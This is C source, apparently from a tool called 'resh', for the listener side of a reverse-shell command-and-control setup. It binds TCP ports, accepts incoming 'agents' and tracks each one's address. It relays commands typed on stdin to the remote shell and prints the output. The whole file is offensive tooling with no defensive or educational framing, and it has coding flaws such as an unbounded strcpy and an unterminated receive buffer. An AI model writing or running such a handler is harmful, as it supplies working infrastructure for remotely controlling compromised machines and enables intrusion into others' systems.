#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#include "resh.h"
#include "srv.h"

int
setupsock(int p)
{
	int lfd;
	struct sockaddr_in adr;

	memset(&adr, 0, sizeof(adr)); /* zero out struct */

	adr.sin_family = AF_INET; /* IPv4 */
	adr.sin_addr.s_addr = htonl(INADDR_ANY); /* 0.0.0.0 */
	adr.sin_port = htons(p); /* port */

	if ((lfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) /* IPv4, TCP, Default based on request */
		return 0;
	if (bind(lfd, (struct sockaddr*) &adr, sizeof(adr)) < 0)
		return 0;
	if (listen(lfd, 3) < 0)
		return 0;
	return lfd;
}

void
interact(int fd, Agents *n)
{
	int clr; /* client recieved */
	char sbuf[2048], rbuf[8192];

	while ((clr = recv(fd, rbuf, sizeof(rbuf), 0)) > 0) {
		if (!(fgets(sbuf, sizeof(sbuf), stdin)))
			die("Failed to read command\n");
		if ((send(fd, sbuf, strlen(sbuf), 0)) < 0)
			die("Failed to send data\n");
		rtrim(rbuf);
		printf("%.*s", (int) strlen(rbuf), rbuf);
	}
	n->alive = 0;
	die("Connection closed: %s\n", n->ip);
}

void
listener(unsigned p0, unsigned p1, Agents *pa, pid_t p)
{
	int fd0, fd1, i = 0;
	pid_t pid;
	if (!(fd0 = setupsock(p0)) || !(fd1 = setupsock(p1))){
		kill(p, SIGKILL);
		die("Failed to set up socket\n");
	}

	while(1) {
		int sfd; /* session fd */
		size_t inc_adr_len;
		struct sockaddr_in inc_adr; /* incomming */

		memset(&inc_adr, 0, sizeof(inc_adr));
		inc_adr_len = sizeof(inc_adr);

		if ((sfd = accept(fd0, (struct sockaddr*) &inc_adr, (socklen_t*) &inc_adr_len)) < 0) {
			kill(p, SIGKILL);
			die("Failed to accept connection\n");
		}
		printf("Connection from: %s\n", inet_ntoa(inc_adr.sin_addr));
		if ((pid = fork()) < 0){
			die("Failed to create child process\n");
			kill(p, SIGKILL);
		}
		else if (!pid) { /* Child */
			close(fd0); /* If child, kill the server fp and handle shell recieved */
			close(fd1);
			 /* setup struct for agent */
			pa[i].fp = sfd;
			strcpy(pa[i].ip, inet_ntoa(inc_adr.sin_addr));
			pa[i].index = i;
			pa[i].alive = 1;
			while (pa[i].alive)
				; /* Keep socket alive while alive */
			die("");
		} else { /* Parent */
			i++; /* Next agent gets next index */
			close(sfd); /* server doesn't need child fd */
		}
	}
}
